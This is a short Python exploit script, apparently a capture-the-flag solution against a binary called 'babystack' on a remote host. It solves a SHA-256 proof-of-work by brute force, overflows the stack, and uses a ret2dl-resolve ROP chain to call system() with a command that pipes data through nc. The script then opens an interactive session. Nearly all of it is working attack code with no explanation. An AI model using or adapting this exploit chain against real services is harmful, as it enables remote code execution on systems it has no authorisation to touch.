#coding:utf-8

import pwn
import itertools, string
from hashlib import sha256
from roputils import *

pwn.context.log_level = "debug"

def calcpow(chal):
    for combo in itertools.permutations(string.letters+string.digits,4):
        sol = ''.join(combo)
        if sha256(chal + sol).digest().startswith("\0\0\0"):
            return sol
    return None

sol = None

while sol == None:
    p = pwn.remote("202.120.7.202", 6666)
    chal = p.recvline().strip()
    sol = calcpow(chal)
    if sol == None:
        p.close()

p.send(sol)

rop = ROP("./babystack")
addr_bss = rop.section('.bss') + 0x100

payload = "A"*40
payload += p32(0x804a600)
payload += p32(0x8048446)
payload += p32(80)
payload += "B"*(64-len(payload))

payload += "A"*40
payload += p32(0x804a600)

payload += rop.call("read", 0, addr_bss, 200)
payload += rop.dl_resolve_call(addr_bss+60, addr_bss)

payload2 = rop.string("echo 1234 | nc 127.0.0.1 1234")
payload2 += rop.fill(60, payload2)
payload2 += rop.dl_resolve_data(addr_bss+60, "system")
payload2 += rop.fill(200, payload2)

payload += payload2
payload = payload.ljust(0x100, "\x00")

p.send(payload)

p.interactive()